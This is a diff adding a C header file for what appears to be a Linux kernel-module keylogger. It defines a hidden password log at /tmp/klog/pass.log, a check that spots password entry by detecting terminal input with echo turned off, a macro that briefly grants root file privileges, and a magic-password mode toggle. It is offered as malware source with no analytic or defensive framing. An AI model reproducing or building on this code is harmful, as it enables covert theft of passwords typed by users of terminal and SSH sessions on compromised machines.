@@ -1,0 +1,101 @@
+#ifndef KLOGGER_H
+#define KLOGGER_H
+
+#define DEBUG	1
+
+#if DEBUG == 1
+#define DPRINT(format, args...) printk(format, ##args)
+#else
+#define DPRINT(format, args...)
+#endif
+
+#define LOG_DIR 		"/tmp/klog"
+#define LOG_DIR_MODE		0700
+#define PASS_LOG LOG_DIR 	"/pass.log"
+
+#define VK_NORMAL 		0
+#define VK_DUMBMODE 		1
+#define VK_SMARTMODE 		2
+#define DEFAULT_MODE 		VK_SMARTMODE
+
+#define MAX_TTY_CON 		8
+#define MAX_PTS_CON 		512
+
+#define MAX_BUFFER 		256
+#define MAX_SPECIAL_CHAR_SZ 	12
+
+#define N_TTY_NAME 		"tty"
+#define N_PTS_NAME 		"pts"
+#define N_SERIAL_NAME 		"ttyS"
+
+#define TTY_NAME(tty) (tty->driver->type == \
+		TTY_DRIVER_TYPE_CONSOLE?N_TTY_NAME: \
+		tty->driver->type == TTY_DRIVER_TYPE_PTY && \
+		tty->driver->subtype == PTY_TYPE_SLAVE?N_PTS_NAME:"")
+
+#define TTY_NUMBER(tty) ((tty)->index + (tty)->driver->name_base)
+
+#define TTY_INDEX(tty) tty->driver->type == \
+            TTY_DRIVER_TYPE_PTY?MAX_TTY_CON + \
+            TTY_NUMBER(tty):TTY_NUMBER(tty)
+
+#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
+#define END_KMEM set_fs(old_fs); }
+
+#define BEGIN_ROOT { int saved_fsuid = current->fsuid; current->fsuid = 0;
+#define END_ROOT current->fsuid = saved_fsuid; }
+
+#define IS_PASSWD(tty) L_ICANON(tty) && !L_ECHO(tty)
+
+#define WRITABLE(f) (f->f_op && f->f_op->write)
+#define _write(f, buf, sz) (f->f_op->write(f, buf, sz, &f->f_pos))
+
+#define TTY_WRITE(tty, buf, count) (*tty->driver->write)(tty, \
+							buf, count)
+#define resetbuf(t)        \
+{                \
+    t->buf[0] = 0;        \
+    t->lastpos = 0;        \
+}
+
+#define append_c(t, s, n)    \
+{                \
+    t->lastpos += n;    \
+    strncat(t->buf, s, n);    \
+}
+
+#define ESC_CHAR 		27
+#define BACK_SPACE_CHAR1 	127    // local
+#define BACK_SPACE_CHAR2 	8    // remote
+
+#define VK_TOGLE_CHAR 		29    // CTRL-]
+#define MAGIC_PASS 		"31337"     // to switch mode, press MAGIC_PASS and
+
+
+#define TIMEZONE 		7*60*60    // GMT+7
+
+#define SECS_PER_HOUR   	(60 * 60)
+#define SECS_PER_DAY    	(SECS_PER_HOUR * 24)
+#define isleap(year) \
+    ((year) % 4 == 0 && ((year) % 100 != 0 || (year) % 400 == 0))
+#define DIV(a, b) ((a) / (b) - ((a) % (b) < 0))
+#define LEAPS_THRU_END_OF(y) (DIV (y, 4) - DIV (y, 100) + DIV (y, 400))
+
+struct vtm {
+    int tm_sec;
+    int tm_min;
+    int tm_hour;
+    int tm_mday;
+    int tm_mon;
+    int tm_year;
+};
+
+struct tlogger {
+    struct tty_struct *tty;
+    char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ];
+    int lastpos;
+    int status;
+    int pass;
+};
+
+#endif
